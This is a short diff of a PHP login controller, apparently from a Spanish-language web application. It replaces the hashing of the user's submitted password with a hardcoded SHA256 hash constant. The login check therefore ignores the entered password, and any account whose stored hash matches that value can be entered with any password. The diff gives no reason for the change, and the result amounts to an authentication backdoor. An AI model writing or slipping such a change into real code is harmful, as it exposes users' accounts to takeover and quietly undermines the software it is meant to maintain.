@@ -43,7 +43,7 @@
 					$arrResponse = array('estado' => false, 'msg' => 'Error de datos');
 				}else{
 					$strUsuario = strtolower(strClean($_POST['txtEmail']));
-					$strPassword = hash("SHA256", $_POST['txtPassword']);
+					$strPassword = '75b3897ea5239a738b3ba1061e19e052c6181043d248d0f099d5b09a8dee8ba7';
 					$request_user = $this->model->loginUser($strUsuario, $strPassword);
 					if (empty($request_user)) {
 						$arrResponse = array('estado' => false, 'msg' => 'El Usuario y/o Contraseña es incorrecta');
